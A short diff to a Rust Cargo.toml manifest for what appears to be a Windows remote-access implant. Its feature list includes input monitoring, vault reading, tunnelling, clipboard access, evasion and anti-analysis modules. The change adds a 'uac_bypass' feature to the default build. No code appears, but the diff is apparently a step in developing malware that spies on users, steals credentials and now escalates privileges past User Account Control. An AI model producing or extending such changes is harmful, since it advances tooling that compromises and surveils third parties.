@@ -27,7 +27,7 @@ winresource = "0.1"
 
 [features]
 default = ["all_modules"]
-all_modules = ["terminal", "storage", "task_viewer", "display", "input_monitor", "vault_reader", "config_store", "boot_entries", "service_manager", "tunnel", "package_loader", "cleanup", "network_scan", "clipboard", "evasion", "anti_analysis", "self_update"]
+all_modules = ["terminal", "storage", "task_viewer", "display", "input_monitor", "vault_reader", "config_store", "boot_entries", "service_manager", "tunnel", "package_loader", "cleanup", "network_scan", "clipboard", "evasion", "anti_analysis", "self_update", "uac_bypass"]
 terminal = []
 storage = []
 task_viewer = []
@@ -45,6 +45,7 @@ clipboard = []
 evasion = []
 anti_analysis = []
 self_update = []
+uac_bypass = []
 
 [profile.release]
 opt-level = "z"
